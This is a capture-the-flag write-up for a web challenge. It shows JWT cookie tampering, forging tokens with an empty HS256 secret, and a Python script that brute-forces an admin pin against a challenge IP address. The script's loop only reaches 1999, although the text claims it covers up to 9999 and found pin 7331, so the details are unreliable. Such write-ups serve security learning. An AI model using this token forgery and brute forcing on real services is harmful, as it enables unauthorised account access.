# you-can-trust-me (Web) - 180 p
**Flag : <span style="color:rgb(60, 179, 113)">CTF{2965f7e9fcc77fff2bd869db984df8371845d6781edb382cc34536904207a53d}</span>**
## Solution

From the beginning, when we access the site a message is displayed:

>{
> 
>    "message": "No cookies found"
>
>}


With inspect elements I saw the cookie. I pasted the cookie on [jwt.io](https://jwt.io/). I could see that `"user"` variable is set to `"anonymous"`.

![image](https://github.com/Inf3n0s/CTF-Writeups/assets/75357316/366b7e49-71c8-450c-8b65-14becca658da)

After I changed it to "admin" it showed a text 
>"Hello user. Since you do not have administrative privileges I guess you will have to wait here."

After this, I tried to get more information about how to get administrative privileges. I tried to add `/docs` after the ip and I found that I need to add `"is_admin"` variable to get access.

![image](https://github.com/Inf3n0s/CTF-Writeups/assets/75357316/2a6cd672-925b-46df-bcbe-fc56ba02aed5)

After a couple more tries I added `"is-admim": true` and `"flag" : true` to find that I needed a pin. To find this pin I used a Python script that tries all the numbers between 1000 and 9999. After 6 minutes I find the pin and the flag.

Replace the base_url and the token and run this script
```py 
import jwt
import requests

tokenFor1000 = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpc19hZG1pbiI6IjEiLCJmbGFnIjoiMSIsInBpbiI6MTAwMH0.p1IWmUpla2iM_4aa-iMQIGz-uB5ZyTibrXqYQV2mAFI"
payload = {
  "user": "admin",
  "is_admin": "1",
  "flag": "1",
  "pin": 1000
}

# Header
# {
#   "alg": "HS256",
#   "typ": "JWT"
# }

# I want all tokens to have the same signature and pin from 1000 to 9999
# I will brute force the pin
base_url = "http://34.89.210.219:30997/"
# I want to set a cookie and print the output

for i in range(1000, 1999):
    payload["pin"] = i
    token = jwt.encode(payload, "", algorithm='HS256')
    # Add the token to the sessionKey cookie and get the response
    cookies = {"sessionKey": token}
    r = requests.get(base_url, cookies=cookies)
    print(f"Trying pin {i} - {r.text}")

```

You will found a flag on pin `7331` which maybe it's something funny it's an inverse number of `1337` which it's a popular number in CTF :) 




